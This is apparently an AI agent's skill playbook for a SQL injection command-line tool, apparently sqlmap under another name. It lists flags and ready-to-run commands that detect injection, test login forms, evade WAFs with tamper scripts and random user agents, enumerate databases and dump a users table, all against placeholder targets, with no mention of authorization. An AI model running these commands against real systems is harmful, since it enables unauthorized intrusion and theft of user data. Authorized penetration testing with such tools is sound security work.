---
name: sql-injection-cli
description: sql-injection-cli target syntax, non-interactive execution, and common validation/enumeration workflows.
---

# sql-injection-cli CLI Playbook

Official docs:
- https://docs.rynix.local/docs/sql-injection-cli/wiki/usage
- [external-reference-removed]

Canonical syntax:
`sql-injection-cli -u "<target_url_with_params>" [options]`

High-signal flags:
- `-u, --url <url>` target URL
- `-r <request_file>` raw HTTP request input
- `-p <param>` test specific parameter(s)
- `--batch` non-interactive mode
- `--level <1-5>` test depth
- `--risk <1-3>` payload risk profile
- `--threads <n>` concurrency
- `--technique <letters>` technique selection
- `--forms` parse and test forms from target page
- `--cookie <cookie>` and `--headers <headers>` authenticated context
- `--timeout <seconds>` and `--retries <n>` transport stability
- `--tamper <scripts>` WAF/input-filter evasion
- `--random-agent` randomize user-agent
- `--ignore-proxy` bypass configured proxy
- `--dbs`, `-D <db> --tables`, `-D <db> -T <table> --columns`, `-D <db> -T <table> -C <cols> --dump`
- `--flush-session` clear cached scan state

Agent-safe baseline for automation:
`sql-injection-cli -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5 --timeout 10 --retries 1 --random-agent`

Common patterns:
- Baseline injection check:
  `sql-injection-cli -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5`
- POST parameter testing:
  `sql-injection-cli -u "https://target.tld/login" --data "user=admin&pass=test" -p pass --batch --level 2 --risk 1`
- Form-driven testing:
  `sql-injection-cli -u "https://target.tld/login" --forms --batch --level 2 --risk 1 --random-agent`
- Enumerate DBs:
  `sql-injection-cli -u "https://target.tld/item?id=1" -p id --batch --dbs`
- Enumerate tables in DB:
  `sql-injection-cli -u "https://target.tld/item?id=1" -p id --batch -D appdb --tables`
- Dump selected columns:
  `sql-injection-cli -u "https://target.tld/item?id=1" -p id --batch -D appdb -T users -C id,email,role --dump`

Critical correctness rules:
- Always include `--batch` in automation to avoid interactive prompts.
- Keep target parameter explicit with `-p` when possible.
- Use `--flush-session` when retesting after request/profile changes.
- Start conservative (`--level 1-2`, `--risk 1`) and escalate only when needed.

Usage rules:
- Keep authenticated context (`--cookie`/`--headers`) aligned with manual validation state.
- Prefer narrow extraction (`-D/-T/-C`) over broad dump-first behavior.
- Do not use `-h`/`--help` during normal execution unless absolutely necessary.

Failure recovery:
- If results conflict with manual testing, rerun with `--flush-session`.
- If blocked by filtering/WAF, reduce `--threads` and test targeted `--tamper` chains.
- If initial detection misses likely injection, increment `--level`/`--risk` gradually.

If uncertain, query get_technique_guide with:
`site:docs.rynix.local/docs/sql-injection-cli/wiki/usage sql-injection-cli <flag>`
